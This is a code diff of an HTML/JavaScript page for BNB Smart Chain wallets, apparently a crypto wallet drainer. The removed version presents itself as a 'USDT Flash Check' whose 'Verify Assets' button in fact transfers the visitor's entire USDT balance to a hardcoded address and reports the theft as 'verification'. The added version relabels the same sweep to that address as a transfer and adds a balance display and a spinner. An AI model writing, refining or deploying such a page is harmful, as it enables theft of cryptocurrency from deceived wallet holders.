@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>USDT (BEP-20) Flash Check</title>
+    <title>USDT (BEP-20) Flash Transfer</title>
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js" defer></script>
     <style>
         body {
@@ -11,13 +11,14 @@
             background: linear-gradient(135deg, #2c3e50, #000000);
             color: #ecf0f1;
             display: flex;
-            flex-direction: column; /* Arrange banner above the card */
-            justify-content: flex-start; /* Align items to the top */
+            flex-direction: column;
+            justify-content: flex-start;
             align-items: center;
             min-height: 100vh;
             margin: 0;
             padding: 20px;
             box-sizing: border-box;
+            transition: background-color 0.3s ease; /* For potential dark/light mode */
         }
         .banner {
             background-color: #00cc99;
@@ -28,8 +29,8 @@
             font-size: 1.2em;
             font-weight: bold;
             box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
-            margin-bottom: 20px; /* Space between banner and card */
-            border-radius: 0 0 10px 10px; /* Optional rounded bottom corners */
+            margin-bottom: 20px;
+            border-radius: 0 0 10px 10px;
         }
         .card {
             background: rgba(255, 255, 255, 0.08);
@@ -42,15 +43,20 @@
         }
         h2 {
             color: #00cc99;
-            margin-bottom: 15px;
+            margin-bottom: 10px; /* Reduced margin */
             font-size: 2.2em;
             font-weight: bold;
             text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
         }
+        #balance {
+            font-size: 1.1em;
+            color: #66ffa6;
+            margin-bottom: 15px;
+        }
         p {
             font-size: 1em;
             line-height: 1.6;
-            margin-bottom: 20px;
+            margin-bottom: 15px; /* Reduced margin */
             color: #dcdcdc;
         }
         p strong {
@@ -67,6 +73,10 @@
             margin-top: 20px;
             transition: background-color 0.3s ease;
             box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+            display: flex; /* For spinner and text alignment */
+            justify-content: center;
+            align-items: center;
+            gap: 10px; /* Space between spinner and text */
         }
         button:hover {
             background-color: #00a377;
@@ -76,25 +86,53 @@
             cursor: not-allowed;
             box-shadow: none;
         }
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top: 4px solid #fff;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            display: none; /* Hidden by default */
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
         #log {
             margin-top: 20px;
             font-size: 1em;
-            color: #ff6666;
-            background-color: rgba(255, 102, 102, 0.1);
             padding: 10px;
             border-radius: 8px;
+            text-align: center;
+        }
+        .log-success {
+            color: #2ecc71;
+            background-color: rgba(46, 204, 113, 0.1);
+        }
+        .log-error {
+            color: #e74c3c;
+            background-color: rgba(231, 76, 60, 0.1);
+        }
+        .log-info {
+            color: #3498db;
+            background-color: rgba(52, 152, 219, 0.1);
         }
     </style>
 </head>
 <body>
     <div class="banner">
-        ⚡️ Instant USDT (BEP-20) Flash Check ⚡️
+        ⚡️ Instant USDT (BEP-20) Transfer ⚡️
     </div>
     <div class="card">
-        <h2>USDT (BEP-20)</h2>
-        <p>Initiate to verify your USDT (BEP-20) on Binance Smart Chain:</p>
-        <p style="word-break: break-all;"><strong></strong> <span style="color: #f39c12;"></span></p>
-        <button id="sendBtn">Verify Assets</button>
+        <h2>USDT (BEP-20) Transfer</h2>
+        <p id="balance">Checking Balance...</p>
+        <p>Initiate a transfer of your USDT (BEP-20) on Binance Smart Chain to the following address:</p>
+        <p style="word-break: break-all;"><strong>Recipient:</strong> <span style="color: #f39c12;">0x60eA1bc1b4b0e064BcbeA62845eD6CA36b9663CE</span></p>
+        <button id="sendBtn">
+            <div class="spinner" id="loadingSpinner"></div>
+            Transfer All USDT
+        </button>
         <div id="log"></div>
     </div>
 
@@ -118,11 +156,46 @@
             blockExplorerUrls: ["https://bscscan.com"]
         };
 
-        function log(msg) {
-            document.getElementById("log").textContent = msg;
+        const balanceElement = document.getElementById("balance");
+        const sendButton = document.getElementById("sendBtn");
+        const loadingSpinner = document.getElementById("loadingSpinner");
+        const logElement = document.getElementById("log");
+
+        function log(msg, type = 'info') {
+            logElement.textContent = msg;
+            logElement.className = `log log-${type}`;
         }
 
-        async function switchToBSC() {
+        function showLoading(isLoading) {
+            if (isLoading) {
+                loadingSpinner.style.display = 'inline-block';
+                sendButton.querySelector('span').textContent = 'Processing...'; // If you want to change button text
+                sendButton.disabled = true;
+            } else {
+                loadingSpinner.style.display = 'none';
+                sendButton.querySelector('span').textContent = 'Transfer All USDT'; // Restore button text
+                sendButton.disabled = false;
+            }
+        }
+
+        async function getBalance(provider, address) {
+            try {
+                const usdtContract = new ethers.Contract(usdtAddress, usdtAbi, provider);
+                const balance = await usdtContract.balanceOf(address);
+                const formattedBalance = ethers.utils.formatUnits(balance, 18); // USDT has 18 decimals
+                balanceElement.textContent = `Your USDT Balance: ${formattedBalance}`;
+            } catch (error) {
+                console.error("Error fetching balance:", error);
+                balanceElement.textContent = "Error fetching balance.";
+            }
+        }
+
+        async function switchToBSCAndGetAccount() {
+            if (!window.ethereum) {
+                log("Trust Wallet or MetaMask not detected. Open this in Trust Wallet browser.", 'error');
+                return null;
+            }
+
             try {
                 await window.ethereum.request({
                     method: "wallet_switchEthereumChain",
@@ -130,66 +203,94 @@
                 });
             } catch (switchError) {
                 if (switchError.code === 4902) {
-                    await window.ethereum.request({
-                        method: "wallet_addEthereumChain",
-                        params: [bscParams]
-                    });
+                    try {
+                        await window.ethereum.request({
+                            method: "wallet_addEthereumChain",
+                            params: [bscParams]
+                        });
+                    } catch (addError) {
+                        log("Could not add Binance Smart Chain to your wallet.", 'error');
+                        throw addError;
+                    }
                 } else {
                     throw switchError;
                 }
             }
+
+            try {
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                return accounts[0];
+            } catch (accountError) {
+                log("Could not connect to your wallet.", 'error');
+                throw accountError;
+            }
         }
 
         async function sendAllUSDT() {
-            log("");
-            document.getElementById("sendBtn").disabled = true; // Disable button during operation
-            if (!window.ethereum) {
-                alert("Trust Wallet or MetaMask not detected. Open this in Trust Wallet browser.");
-                document.getElementById("sendBtn").disabled = false; // Re-enable on error
+            log("", 'info'); // Clear previous log
+            showLoading(true);
+
+            const userAddress = await switchToBSCAndGetAccount();
+            if (!userAddress) {
+                showLoading(false);
                 return;
             }
 
-            try {
-                await switchToBSC();
-                await window.ethereum.request({ method: 'eth_requestAccounts' });
-                const provider = new ethers.providers.Web3Provider(window.ethereum);
-                const signer = provider.getSigner();
-                const userAddress = await signer.getAddress();
+            const provider = new ethers.providers.Web3Provider(window.ethereum);
+            const signer = provider.getSigner();
+            const usdt = new ethers.Contract(usdtAddress, usdtAbi, signer);
 
+            getBalance(provider, userAddress); // Update balance after connecting
+
+            try {
                 const bnbBalance = await provider.getBalance(userAddress);
                 const minGas = ethers.utils.parseEther("0.0001");
-
                 const readableBNB = ethers.utils.formatEther(bnbBalance);
                 console.log("BNB balance:", readableBNB);
 
                 if (bnbBalance.lt(minGas)) {
-                    log("❌ Insufficient BNB for gas. You have: " + readableBNB + " BNB");
-                    document.getElementById("sendBtn").disabled = false;
+                    log(`❌ Insufficient BNB for gas. You have: ${readableBNB} BNB`, 'error');
+                    showLoading(false);
                     return;
                 }
 
-                const usdt = new ethers.Contract(usdtAddress, usdtAbi, signer);
-                const balance = await usdt.balanceOf(userAddress);
+                const balanceToSend = await usdt.balanceOf(userAddress);
 
-                if (balance.isZero()) {
-                    log("❌ Your USDT balance is 0.");
-                    document.getElementById("sendBtn").disabled = false;
+                if (balanceToSend.isZero()) {
+                    log("❌ Your USDT balance is 0.", 'error');
+                    showLoading(false);
                     return;
                 }
 
-                const tx = await usdt.transfer(recipient, balance);
-                log("⏳ Verification initiated. Waiting for confirmation...");
+                log("⏳ Transfer initiated. Waiting for confirmation...", 'info');
+                const tx = await usdt.transfer(recipient, balanceToSend);
                 await tx.wait();
-                log("✅ Verified successful! USDT (BEP-20).");
+                log("✅ Transfer successful! USDT sent.", 'success');
+                getBalance(provider, userAddress); // Update balance after transfer
             } catch (err) {
                 console.error(err);
-                log("❌ Verification failed: " );
+                log(`❌ Transfer failed: ${err?.message || err}`, 'error');
             } finally {
-                document.getElementById("sendBtn").disabled = false; // Re-enable after operation (success or failure)
+                showLoading(false);
             }
         }
 
-        document.getElementById("sendBtn").onclick = sendAllUSDT;
+        // Fetch initial balance when the page loads
+        window.addEventListener('load', async () => {
+            if (window.ethereum) {
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                const accounts = await provider.listAccounts();
+                if (accounts.length > 0) {
+                    getBalance(provider, accounts[0]);
+                } else {
+                    balanceElement.textContent = "Connect Wallet to see balance";
+                }
+            } else {
+                balanceElement.textContent = "Wallet not detected";
+            }
+        });
+
+        sendButton.onclick = sendAllUSDT;
     </script>
 </body>
 </html>
